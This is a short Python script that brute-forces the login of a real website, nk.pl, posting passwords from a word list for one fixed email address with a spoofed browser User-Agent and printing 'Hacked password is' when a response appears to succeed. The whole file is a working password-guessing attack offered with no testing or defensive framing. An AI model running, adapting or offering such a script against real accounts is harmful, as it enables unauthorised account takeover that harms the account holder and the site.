import time

import requests

start = time.time()
hacked = False
with open("test.txt", "r") as file:
    for password in file:
        print("Trying", password)
        response = requests.post("https://nk.pl/logowanie", data={
            "login": "vgwgsrnpxyybjnahtz@twzhhq.online",
            "password": password
        }, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
        })
        if response.content.decode("utf-8").startswith("<!DOCTYPE"):
            hacked = True
        if hacked:
            print("Hacked password is", password)
            break
        else:
            print("Fail")

    end = time.time()
print(end - start)